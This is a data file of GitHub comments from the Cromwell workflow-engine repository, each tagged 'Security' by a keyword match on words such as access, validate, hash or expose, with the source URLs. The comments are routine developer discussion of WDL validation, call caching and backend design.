Security,"@cjllanwarne Yes, my money is that you have pegged this exactly. I would love this update. I prefer the ``Int? mem=4`` for specifying default values. Otherwise, we have to pepper our command and runtime blocks with ``${default=4 mem}`` or, even worse, something with ``select_first``. We often have inputs that are derived (e.g. ``e``) and we do not want these exposed in ``wdltool inputs ...``. I do not have a good idea for how to handle ``f``. I'm assuming you do not have access to the raw expression when rendering ``wdltool inputs ...``, so can you just say that it has a complex default expression?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2532#issuecomment-321288565:361,expose,exposed,361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2532#issuecomment-321288565,2,"['access', 'expose']","['access', 'exposed']"
Security,@cjllanwarne can you explain why users use Pair access?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2300#issuecomment-332235119:48,access,access,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2300#issuecomment-332235119,1,['access'],['access']
Security,"@cjllanwarne commented on [Mon May 22 2017](https://github.com/broadinstitute/wdl4s/issues/112). This problem presents itself when using `wdltool` but it looks like it's a match error coming from inside `WDL4S`. null.wdl:; ```; task empty{; command {}; output {; File out = ""${output}""; }; }; ```. On validate:; ```; $ java -jar target/scala-2.12/wdltool-0.11.jar validate ~/myWorkflows/null.wdl; null; ```. We can see more details when we try to graph it:; ```; $ java -jar target/scala-2.12/wdltool-0.11.jar graph ~/myWorkflows/null.wdl; Exception in thread ""main"" scala.MatchError: null; 	at wdl4s.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:44); 	at wdl4s.WdlExpression$.evaluate(WdlExpression.scala:85); 	at wdl4s.WdlExpression.evaluate(WdlExpression.scala:161); 	at wdl4s.expression.ValueEvaluator.replaceInterpolationTag(ValueEvaluator.scala:20); 	at wdl4s.expression.ValueEvaluator.$anonfun$interpolate$2(ValueEvaluator.scala:33); 	at scala.collection.TraversableOnce.$anonfun$foldLeft$1(TraversableOnce.scala:157); 	at scala.collection.TraversableOnce.$anonfun$foldLeft$1$adapted(TraversableOnce.scala:157); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2703:301,validat,validate,301,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2703,2,['validat'],['validate']
Security,@cjllanwarne is this still true ? From what I see the EJEA is waiting for the hashes to be written before reporting that it's finished,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1995#issuecomment-305589282:78,hash,hashes,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1995#issuecomment-305589282,1,['hash'],['hashes']
Security,"@cjllanwarne the reason was that `WdlNamespace.load` was throwing an `ValidationException` which unfortunately is a `Throwable` but not an `Exception`, which is why there's also a PR in lenthall to make `AggregatedException` an `Exception`... I can't find a `missing_import` test in centaur though",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572:70,Validat,ValidationException,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572,1,['Validat'],['ValidationException']
Security,"@cjllanwarne yes, comments were hidden due to file name change.; Ans 1. Adding hidden comment I did: Caching functionality is missing here. Shouldn't each backend implement caching and when engine ask for a jobExecutor, backend may return BackendCachedJobExecutor?; Doing that we can get rid of the engine responsibility to deal with cached data...; IMO, Cache should be encapsulated in each backend. The only thing I'm not sure if we should expose a standard message to force not to use cached data. So with that you tell to each backend to not use cached data but instead to process data again.; Ans 2. I'm not seeing any new msg for WorkflowBackendActor right now. That will depend on the UCs... for CCC backend those msgs are OK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495:442,expose,expose,442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495,1,['expose'],['expose']
Security,"@cjllanwarne: I also encountered this issue. Until the mentioned upgrade script is released, is information available that highlights the changes necessary to migrate from draft 2 (or 3/1) to WDL 1.0? My files are in draft-2 format. Any sort of guidance about what's different between the versions would be helpful. Doing a visual diff of the `SPEC.md` files isn't ideal... Somewhat related: Is there an estimate of when womtool will have `-imports` exposed as a parameter?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-399565111:450,expose,exposed,450,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-399565111,2,['expose'],['exposed']
Security,"@curoli commented on [Wed Oct 04 2017](https://github.com/broadinstitute/wdl4s/issues/248). Currently, subclasses of WOM GraphNodes are case classes which auto-generate equals and hashCode based on components. This doesn't work well for two reasons.; First, WOM Graph assumes object identity and will fail if a node is replaced by one that is equal based on components. The code is already in several places using eq instead of == to account for this.; Second, since graph nodes contain all upstream nodes, component-based hashCode or equals are unworkable for real-life pipelines, because hashCode/equals will be called for every upstream node through every possible upstream path, which grows exponentially with graph size for workflows that contain branches that rejoin (and most do). . ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334536133). I think this comment is more appropriate here:. Equals is supposed to be bitwise/value-based equality, whereas `eq` indicates reference equality. I don't recall the exact motivation behind using `eq` in the test, maybe @cjllanwarne can comment when he returns on Tuesday. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334555964). If you don't like this fix, what do you suggest we do instead? How about we accept this fix now and you can rework the whole thing later, if you want?. This is a show-stopper once you want to create larger (aka real-life) workflows. . For example: if node a has two outputs, which are inputs of b, then b.hashCode calls a.hasCode twice. If b produces two outputs which are inputsof c, then c.hashCode calls b.hashCode twice, and a.hashCode is called four times. If c produces two outputs which are inputs of d, d.hashCode calls c.hashCode twice, b.hashCode four times and a.hashCode eight times, etc. . ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:180,hash,hashCode,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,6,['hash'],['hashCode']
Security,"@danbills The Orchestrator pattern as described above is what we discussed. . Per your other questions, the answer is that AWS Batch does not take a array of arbitrary scripts as an option, nor can you override a Docker container's `ENTRY_POINT` to supply your own script if the entry point of the container has been changed from the default shell. You can only specify an array to pass into Docker daemon's `CMD`. Speaking of default shells, the other arguments against a set of shell scripts is that it limits the set of containers that can be called from a WDL. For example, the current Cromwell scripts that are injected into the container assume Bash support, but by default Alpine Linux (and many containers that build off of it) do not have Bash installed. . Most of the time the above two items are safe assumptions, but not always, hence the current plan to implement data staging via a sibling container approach similar to how CI systems are deployed today. For inspiration, I refer to [Dave Hein's excellent article on running sibling containers in lieu of docker-in-docker](https://www.develves.net/blogs/asd/2016-05-27-alternative-to-docker-in-docker/)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987:616,inject,injected,616,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987,1,['inject'],['injected']
Security,@davidbernick @hjfbynara would you please confirm update script has been run so that I can rule out pingdom/firewall issues?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4164#issuecomment-452850659:108,firewall,firewall,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4164#issuecomment-452850659,1,['firewall'],['firewall']
Security,"@delocalizer commented on [Tue Feb 07 2017](https://github.com/broadinstitute/wdltool/issues/23). Currently `wdltool validate` accepts only one argument — a single WDL workflow file. If that file contains import statements then validation fails unless the imports happen to live in the right place relative to the local directory where you're running the command. It'd be great if `wdltool validate` would do the same as cromwell, i.e. accept a zipfile of imports to resolve against, so that you can validate the files that you're actually going to submit to the server, e.g.; `wdltool validate myWorkflow.wdl myImports.zip`. ---. @geoffjentry commented on [Tue Feb 07 2017](https://github.com/broadinstitute/wdltool/issues/23#issuecomment-278205682). This is a great idea. Tagging @katevoss in case she doesn't yet watch this repo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2879:117,validat,validate,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2879,5,['validat'],"['validate', 'validation']"
Security,"@dheiman for what it's worth, ""why a call was cached"" is very conservative, so you can be assured that yes, your file's hash exactly matched the old input. As indeed did every other input value, the command string, the relevant workflow and runtime options, and the docker image specified. If anything wasn't the same, Cromwell wouldn't have used the cached result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210:120,hash,hash,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210,1,['hash'],['hash']
Security,@dinvlad In my PR (#5023) the intention was to allow users to be able to interact with BQ from inside their WDL commands. With that in mind I believe what you're suggesting is that nothing untoward would happen unless they did this and their service account didn't have the corresponding permission set. Is that correct?. I still think it's worth testing to be sure but since it looks like we've added scopes before w/o issue I'm less fearful .... but IMO there's still a risk and we should make sure the risk is 0. Denis - it's on my list to poke at this but if you all don't want to wait for me and would like to validate success/failure please feel free to do so,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296:615,validat,validate,615,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296,1,['validat'],['validate']
Security,"@dtenenba , @vortexing - The [docs](https://docs.opendata.aws/genomics-workflows) for creating the genomics workflow environment (i.e. AWS Batch and related resources) have been updated. Use of custom AMIs has been deprecated in favor of using EC2 Launch Templates. There's also additional parameter validation under the hood around setting up an environment for Cromwell to avoid these configuration errors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885:300,validat,validation,300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885,1,['validat'],['validation']
Security,@dvoet Is it acceptable for Cromwell to hash the dos url string itself for the purposes of call caching? Would this ever be different in the future?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396066752:40,hash,hash,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396066752,1,['hash'],['hash']
Security,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:71,checksum,checksum,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880,2,"['checksum', 'validat']","['checksum', 'validation']"
Security,"@eddiebroad commented on [Wed Aug 10 2016](https://github.com/broadinstitute/wdltool/issues/12). I try to use wdltool validate on a WDL and it seems to _not_ catch; an error in the WDL. In the example ""bad"" WDL attached the call to VCF_to_MAF_task; has the line ""inputVCF=inputVCF"" but the ""inputVCF"" exists only; in the task but not at the workflow level ; but invoking wdltool 0.4 on it seems to _NOT_; cause an error. Shouldn't it be saying the WDL has an error; because inputVCF does _not_ exist at the workflow level?. I downloaded the wdltool from the latest release; https://github.com/broadinstitute/wdltool/releases/download/0.4/wdltool-0.4.jar. the two WDLs are attached. [wdl_files.zip](https://github.com/broadinstitute/wdltool/files/412067/wdl_files.zip). ```; wm8b1-75c:red_bug esalinas$ find *.wdl -exec java -jar wdltool-0.4.jar validate {} \;. wm8b1-75c:red_bug esalinas$ diff good.wdl bad.wdl ; 188c188; < inputVCF=inVCF,. ---; > inputVCF=inputVCF,; wm8b1-75c:red_bug esalinas$ ; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2876:118,validat,validate,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2876,2,['validat'],['validate']
Security,"@francares I'm not saying the engine itself _needs_ to know (although I could envision a scenario where it'd be useful for it to know), I'm saying that the outside world needs to know information particular to the backend. That information needs to be stored somewhere and right now the only somewhere is in the DB which is accessed purely through engine. I see this PR as a transition point - it's against develop which does _not_ have pluggable backends but starts to remove the direct requirements (i.e. the backend specific tables). It's not the final state things will live in but it makes the ultimate changes smaller down the road.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182531090:324,access,accessed,324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182531090,1,['access'],['accessed']
Security,"@francares The backend call actor sends the call to a backend for execution. The FinalCall actor runs tidy-up code locally (i.e. inside cromwell) at the end of an entire workflow (for now - the nice thing about having this in the actor ecosystem is that it's easy to move these wherever and whenever we want). This change is mainly just refactoring of a Future into an explicit actor, so that we can add more easily (do you have access to the Jira backlog? See issue 2542). Your second comment sound ominous... could you elaborate?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173585608:429,access,access,429,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173585608,1,['access'],['access']
Security,@gauravs90 @francares Please note I've rebased and therefore had to update the ValidateActor to no longer require a backend on construction. I've also modified ValidateActorSpec to feed in the mock backend to the static CromwellBackend pool during testing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/586#issuecomment-199336078:79,Validat,ValidateActor,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/586#issuecomment-199336078,2,['Validat'],"['ValidateActor', 'ValidateActorSpec']"
Security,"@gauravs90 I'm slightly confused here!. The model I thought we agreed on was:; - Everything has access to the `ServiceRegistry`; - Anyone (including the Engine) can send a `MetadataPut` message to the `ServiceRegistry`, which will forward it automagically to the `MetadataService`.; - ... That's it!. So, just send a bunch of `MetadataPut` messages to `ServiceRegistry` from the engine, and you're done, no need for all the extra stuff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219083782:96,access,access,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219083782,1,['access'],['access']
Security,"@gauravs90 I've generally seen the akka folks recommend directly passing references to actors which need to be used. That has multiple benefits (e.g. makes it easy to switch out and/or dep injection, etc). My off the cuff reaction is that that seems simpler to just pass the required reference around, although I'll admit I'm basing that purely on your description and not having looked at the changes yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/822#issuecomment-218866972:189,inject,injection,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/822#issuecomment-218866972,2,['inject'],['injection']
Security,@gauravs90 is it possible to make ValidateActor a singleton in this PR or would you rather spin that out as a new PR?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196365782:34,Validat,ValidateActor,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196365782,1,['Validat'],['ValidateActor']
Security,"@gemmalam - I am trying to access the JIRA tickets for cromwell. I followed the link in the README and created an account, but I'm getting a message ""<my_email_address> doesn't have access to Jira on broadworkbench.atlassian.net.""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1095862028:27,access,access,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1095862028,2,['access'],['access']
Security,@gemmalam Could you give me access to view this issue? email: davycats.dc@gmail.com,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498156531:28,access,access,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498156531,1,['access'],['access']
Security,@gemmalam I tried to create an account but got an error saying I don't have access,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-498771071:76,access,access,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-498771071,1,['access'],['access']
Security,"@geoffjentry , I misspoke. We are, I believe, using the REST API for all Cromwell info and expect to continue to do that. We will not be accessing the DB directly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-262358206:137,access,accessing,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-262358206,1,['access'],['accessing']
Security,"@geoffjentry @mcovarr this script doesn't *validate* anything at all, so yeah... The implication of that is, a person currently has to follow along, and make sure that things are happening at appropriate times. The comments are sort-of deliberately scary to encourage that :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2164#issuecomment-293933413:43,validat,validate,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2164#issuecomment-293933413,1,['validat'],['validate']
Security,@geoffjentry @scottfrazer It seems the parser is validating memory runtime attribute entry when it tries to load namespaces.; I think it should be removed to follow the current idea.; This is the link to the code that is causing related test to fail (look for ignore word in the PR) => https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/RuntimeAttributes.scala; Let me know how to proceed with this...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369:49,validat,validating,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369,1,['validat'],['validating']
Security,"@geoffjentry I did those modifications to runtime attributes memory validation in order to re-use same behavior/code for disk attribute. HtCondor, SGE and TES use same way (data unit) to define disk capacity which is the same way to define memory size as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-293009241:68,validat,validation,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-293009241,1,['validat'],['validation']
Security,"@geoffjentry I share your concern with adding any sort of syntax to the spec, and my first inclination is to fake support enumeration. Im not exactly sure how to do that though, nor am I sure of whether its possible. The cleanest way I can think of implementing would be maybe something like a Java style enum:. ```; enum MyEnum {; ""A"",""B"",""C""; }. workflow wf {; MyEnum thisIsMyEnum; }; ```. Another way that we would be able to do it would be define an Enum type in a workflow like so:. ```; workflow wf {; #This would get overridden at run time, but the value would need to be validated; Enum greeting = [""HELLO"",""GOODBYE""]; or; #Done override anything but validate it; Enum[""HELLO"",""GOODBYE""] greeting; ; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-326603028:579,validat,validated,579,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-326603028,2,['validat'],"['validate', 'validated']"
Security,"@geoffjentry I think we're saying the same thing. This is what I'm thinking : [link](https://www.lucidchart.com/publicSegments/view/288aace2-3423-4364-a5f6-6eff306e754e/image.png). (Which is exactly what is in the other ""proof of concept"" branch but with a DB Actor instead of Validation Actor btw)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195428179:277,Validat,Validation,277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195428179,1,['Validat'],['Validation']
Security,"@geoffjentry I totally agree with having a singleton actor for load balancing / supervision / monitoring etc.. but I think the actual validation work itself is better handled by a one-shot do-and-die actor than by a singleton actor. I don't think the actor that is responsible for load balancing, error handling etc.. should also be responsible for doing the work it's supervising.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589:134,validat,validation,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589,1,['validat'],['validation']
Security,"@geoffjentry I'm working on JES unit test cases now... which are the cases validation should fail if entry is not present?; Let's say Docker entry is not provided in RuntimeAttributes, should validation fails in this case for JES?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212170300:75,validat,validation,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212170300,2,['validat'],['validation']
Security,"@geoffjentry In case this is accessible, can you point me to the udocker singularity work you mentioned?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358310220:29,access,accessible,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358310220,1,['access'],['accessible']
Security,"@geoffjentry Verbosity is just a small part of that. Making different parts of the code aware of the each other, where avoidable, doesn't seem like a very good idea. If I'm not mistaken, what you're saying (and what I initially implemented) is something like the erstwhile `DataAccess` (which would be the `ServiceRegistoryActor` in the current world). With this, each step (actor) of the workflow had a reference to it and pushed to it independently. Any change to the dataAccess might have required changes to all the classes which were accessing it. Alternatively, if there was just one entity which handled the responsibility of collecting the metadata, by sniffing around the actors without their knowledge, and then pushed to the database, we need only change this entity for any modifications if there were to happen to the data access stuff. I'll try to explain with a very simple (and silly) analogy: (Honestly, couldn't come up with anything better.); Consider a ginormous Octopus (= `ServiceRegistry`) with a black ink on the tips of it's tentacles, with each of it's legs touching upon different rooms (= classes) in a house. If someday we decide to replace that octopus with something else, we'll be needing to wipe that ink from all the rooms upon which it was standing. On the other hand, if it were to sit and cuddle up just in a single room, there's simply less and comparatively easy work to do to wipe that up. It's simply the same idea here. The Metadata producing entities in the engine can just go about minding their own business, while a third party (those classes with some weird names currently [CromwellProfilerFsm and WorkflowProfilerActor]) handle what they are meant to do: Profile a given workflow execution. (all the while without explicitly telling those execution engine entities that it's reading it's state and data information). If the intentions are still not clear, let's talk about it tomorrow in the meeting to make progress with this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121:539,access,accessing,539,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121,4,['access'],"['access', 'accessing']"
Security,"@geoffjentry as a part of your spec-ing of CromIAm, we'd like to add to the Role vs. Permission chart on [this page in confluence](https://broadinstitute.atlassian.net/wiki/display/GAWB/Workspace+Access+Control+-+User+experience), with the FireCloud roles and what actions they can take in Cromwell. We'd like you (and @cjllanwarne) to add the Cromwell actions, and Tiffany and I can help with deciding what roles have permission to do the actions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-291577666:196,Access,Access,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-291577666,1,['Access'],['Access']
Security,"@geoffjentry asked me to clarify, so here I am!. Currently, PAPI doesn't understand FOFN... so they are really just a File that contains strings. Often they are created by taking the file output of a scatter call as an array and writing it to an array like. ```; Array[File] vcfs = PreviousTask.output ...; File fofn = write_lines(vcfs); ```. Then that FOFN is used as the parameter to the task, and used by the tool in the command directly. The only thing that gets localized by PAPI is the FOFN itself. Keep in mind right now that the only scenario where this works is where your docker has access to the file, which on Google means when you're running in service account mode, but hopefully we can overcome that in the future. Just for context, my use case here is more like 'resume' than call caching. I don't expect to find results from some previous/other run of the pipeline. It's really that something broke, I tweaked the WDL, and now want to basically pick up where I left off. That's the specific problem I have (and any methods developer will have with a FOFN step). There are two ways I can think of going about this:. 1. Fix call caching to handle FOFNs specifically. This is tricky I think, but is most robust. In this case, I want Cromwell to understand a File of File references as a specific type but just for call caching purposes. 2. Change call caching to re-use files rather than copying, thus the path of the file doesn't changes, the FOFN doesn't change, and the call cache hits. This is how I ended up working around this by splitting the WDL into pieces where I supply the inputs to avoid the cache-miss step. I believe we have this option in the SFS?. In your proposal @cjllanwarne a FileRef would be hashed like a file for job avoidance, but treated like a string for all other purposes (e.g. passing to PAPI, etc)? I think that could work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901:593,access,access,593,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901,4,"['access', 'hash']","['access', 'hashed']"
Security,@geoffjentry exposing the labels in the metadata looks like it will work great. No need to expose the workflow meta object at this point,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313702938:91,expose,expose,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313702938,1,['expose'],['expose']
Security,@geoffjentry how much effort would it be to include the last modified date in the hash? ; @meganshand do you still want this feature? Or have you found a workaround?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1843#issuecomment-330608524:82,hash,hash,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1843#issuecomment-330608524,1,['hash'],['hash']
Security,"@geoffjentry if the use case is really intended for validation criteria on objects which the user sets, I feel the same as you, that this is an abstraction that should not be handled withing wdl/cromwell. . While I understand the use case (we also have toyed around with the idea of this as a feature request) it adds unnecessary boundaries to object types that should be handled at the level of execution and not job submition. . I think what might be of use in these instances, for users (like myself) is using the parameter meta more efficiently to define in writing what constitutes valid entries. . Going back to the idea of objects as typed key Value pairs, I still think this is a valid idea, that has real use cases and purposes. In many cases data must be paired with other corresponding datasets and values. In a scatter operation having these types of structured objects would greatly simplify how we can group data together",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330323656:52,validat,validation,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330323656,2,['validat'],['validation']
Security,@geoffjentry is it appropriate to hash the url itself for caching purposes for this stage?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-395994554:34,hash,hash,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-395994554,1,['hash'],['hash']
Security,"@geoffjentry yes. My current deployment is v42. If you have access to the GATK forums, i put more details in my post there: https://gatkforums.broadinstitute.org/wdl/discussion/24268/aws-batch-randomly-fails-when-running-multiple-workflows/p1?new=1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-514937738:60,access,access,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-514937738,1,['access'],['access']
Security,"@geoffjentry, thanks for the answer :); Actually, we tried to do something similar to how it was done in GCP (or TES) but it didn't work out. We added logging to the `mapCommandLineWomFile` method so that we can see what `womFiles` Cromwell passes to this method. And it turns out Cromwell never passes ""ad hoc"" files to this method, therefore `asAdHocFile`, for example, always returns `None`. In particular, in our integration test (PR #5057) it passes only two womFiles with values something like ; `s3://bucket-name/cromwell-execution/cwl_temp_file_some-numbers.cwl/some-numbers/call-test`; and; `s3://bucket-name/cromwell-execution/cwl_temp_file_some-numbers.cwl/some-numbers/call-test/tmp.59740063`; I'm not sure, but it looks like the first `womValue` somehow related to the `runtimeEnvironment` field in the `StandardAsyncExecutionActor`. The second value is something else too, since ""ad hoc"" files are placed in `call-test` directory.; It is possible that we misunderstood something, but for now, it looks like a dead-end.; By the way, we also tried to override `localizeAdHocValues` method `AwsBatchAsyncBackendJobExecutionActor` so that it would copy ""ad hoc"" files to the ""/cromwell_root"" directory. It fails with an AccessDeniedException.; I hope this gives you an understanding of why we came to the proposed solutions. As I said, perhaps we misunderstood something, so we will be happy if you can give us some hint.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509765587:1230,Access,AccessDeniedException,1230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509765587,1,['Access'],['AccessDeniedException']
Security,"@helgridly ; - Conceptually, this is a list of differences, not a map from known keys to values of interest. Rather, the hashKey is just another piece of information you might be interested in alongside the two calls' hash values.; - I'm keeping the schema well-defined. IMO this will make parsing easier and more precise.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316788346:121,hash,hashKey,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316788346,2,['hash'],"['hash', 'hashKey']"
